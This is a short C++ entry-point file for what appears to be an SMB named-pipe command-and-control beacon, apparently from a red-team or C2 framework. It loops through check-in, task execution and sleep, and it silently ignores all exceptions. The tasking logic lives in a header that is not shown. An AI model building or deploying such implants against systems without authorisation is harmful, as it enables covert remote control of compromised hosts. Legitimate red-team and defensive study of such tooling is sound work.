#include "BeaconSmb.hpp"


using namespace std;


int main(int argc, char* argv[])
{	
	std::string pipeName = "mynamedpipe";
	if(argc > 1)
		pipeName = argv[1];

	std::unique_ptr<Beacon> beacon;
	beacon = make_unique<BeaconSmb>(pipeName);

	bool exit = false;
	while (!exit)
	{
		try 
		{
			beacon->checkIn();

			exit = beacon->runTasks();

			SPDLOG_DEBUG("runTasks exit {0}", exit);
			
			beacon->sleep();
		}
		catch(const std::exception& ex)
		{
			// std::cout << "Exeption " << ex.what() << std::endl;
		}
		catch (...) 
		{
			// std::cout << "Exeption" << std::endl;
		}
	}

	SPDLOG_DEBUG("last checkIn");

	beacon->checkIn();
}